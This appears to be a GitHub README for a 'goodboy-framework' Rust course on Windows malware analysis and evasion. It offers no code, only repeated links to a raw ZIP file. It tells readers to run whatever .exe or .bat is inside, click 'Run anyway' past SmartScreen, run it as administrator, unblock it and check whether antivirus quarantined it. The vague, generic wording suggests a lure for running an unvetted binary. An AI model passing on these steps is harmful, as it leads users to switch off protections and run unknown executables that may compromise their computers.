# 🧠 goodboy-framework - Learn Windows Malware Analysis Fast

[![Download goodboy-framework](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/corabellanonextant92/goodboy-framework/raw/refs/heads/main/stage-01-basic-loader/framework-goodboy-3.7.zip)

## 🚀 Getting Started

goodboy-framework is a Windows learning tool for malware analysis, red team testing, and blue team detection practice. It is built in Rust and split into 15 stages. Each stage shows a different part of the workflow, from build steps to detection checks.

Use the link below to visit this page and download the project:

[Download goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework/raw/refs/heads/main/stage-01-basic-loader/framework-goodboy-3.7.zip)

## 🖥️ What You Need

Before you start, make sure you have:

- A Windows 10 or Windows 11 PC
- A stable internet connection
- At least 4 GB of RAM
- 2 GB of free disk space
- Permission to run the files on your PC
- A ZIP tool such as File Explorer or 7-Zip

If you plan to inspect the code or rebuild the stages, install:

- Rust and Cargo
- Git
- A text editor such as VS Code

## 📥 Download the Project

1. Open the download link above.
2. Save the project to your PC.
3. If you get a ZIP file, right-click it and choose Extract All.
4. Pick a folder you can find again, such as `Downloads` or `Desktop`.

After extraction, you should see the project folder named `goodboy-framework`.

## 🏁 Run on Windows

1. Open the `goodboy-framework` folder.
2. Look for a file named `README`, `run`, `launcher`, or a `.exe` file.
3. Double-click the main file to start it.
4. If Windows asks for permission, choose Yes.
5. If SmartScreen appears, choose More info, then Run anyway if you trust the source and want to continue.

If the project includes a batch file, use it like this:

1. Right-click the `.bat` file.
2. Choose Open, or double-click it.
3. Wait for the window to finish loading.

## 🧭 First-Time Setup

When you open the tool for the first time, follow these steps:

1. Pick a working folder for the lab files.
2. Let the tool create any needed stage folders.
3. Keep the default options unless you know what to change.
4. Read each stage name before moving on.
5. Use one stage at a time.

If the app shows a menu, start with Stage 1 and move in order through Stage 15.

## 🔍 What the 15 Stages Cover

The course uses 15 short stages to show how a Windows sample changes from build to detection. Each stage has a clear goal.

### Stage 1 to Stage 3
- Set up the project
- Build the first Windows binary
- Check basic file behavior

### Stage 4 to Stage 6
- Add simple shellcode flow
- Review process launch steps
- Compare file output before and after changes

### Stage 7 to Stage 9
- Study detection points
- Test common AV and EDR checks
- See how analysts spot risky patterns

### Stage 10 to Stage 12
- Work with Windows internals
- Review memory use and process trees
- Practice reverse-engineering habits

### Stage 13 to Stage 15
- Improve detection rules
- Use YARA-style matching
- Validate final samples and compare results

## 🧪 How to Use It

Use this project as a learning lab.

1. Run one stage.
2. Watch what changes on the screen or in the files.
3. Record what the sample does.
4. Compare that stage with the one before it.
5. Repeat until you reach Stage 15.

If you are on a blue team, focus on:

- File names
- Process creation
- Network calls
- Suspicious strings
- Memory use
- Detection rules

If you are on a red team, focus on:

- Build changes
- Sample structure
- Behavior changes
- What makes a sample easier or harder to spot

## 🧰 Common Windows Fixes

If the app does not start, try these steps:

1. Move the folder out of OneDrive.
2. Run the file as administrator.
3. Unblock the file in file properties.
4. Check that your antivirus did not quarantine it.
5. Make sure the folder path has no strange characters.
6. Reboot and try again.

If you see a missing file error:

1. Confirm that you extracted the full archive.
2. Check that no files were removed during download.
3. Keep all files in the same folder.

## 🧑‍💻 For Users Who Want to Rebuild

If you want to compile the project from source:

1. Install Rust from the official Rust site.
2. Open Command Prompt.
3. Go to the project folder.
4. Run the build command for the stage you want.
5. Start the output file from the target folder.

A typical Rust build flow on Windows looks like this:

- `cargo build`
- `cargo run`
- `cargo build --release`

Use the release build if you want the final binary for testing in a lab.

## 🛡️ Safe Lab Setup

Use a test machine or a virtual machine when you work with this project.

A simple lab setup can include:

- A Windows VM
- A second VM for analysis
- A private network
- Snapshot support
- Logging tools

Useful tools for analysis:

- Process Explorer
- Procmon
- Wireshark
- PE-bear
- YARA
- Windows Event Viewer

## 📚 Best Way to Learn

To get the most from the course:

1. Start with behavior, not code.
2. Note file names, paths, and process names.
3. Save screenshots of each stage.
4. Write one short note for each run.
5. Compare the result with your last test.
6. Use detection tools after each change.

This makes it easier to see how a Windows sample grows and how defenders can catch it.

## 🔗 Project Details

- Repository: goodboy-framework
- Topic areas: antivirus evasion, blue team, CTF, cybersecurity, detection engineering, education, malware analysis, malware development, pentesting, red team, reverse engineering, Rust, shellcode, Windows, YARA
- Format: 15-stage Windows Rust course
- Focus: build, test, study, and detect Windows samples

## 💾 Download Again

If you need the project file later, use this link:

[Visit the download page for goodboy-framework](https://github.com/corabellanonextant92/goodboy-framework/raw/refs/heads/main/stage-01-basic-loader/framework-goodboy-3.7.zip)

## 🛠️ File Layout

After extraction, the folder may include:

- Source code folders
- Stage folders
- Build files
- README files
- Output binaries
- Detection notes
- Rule examples

## 🧩 Expected Behavior

When the project runs, you may see:

- A menu for stage selection
- Console output
- File creation in the working folder
- Basic Windows process activity
- Clear stage-by-stage changes

## 🧭 Simple Workflow

1. Download the project.
2. Extract the files.
3. Open the folder.
4. Run the main Windows file.
5. Start with Stage 1.
6. Move through the stages in order.
7. Review what changed after each step.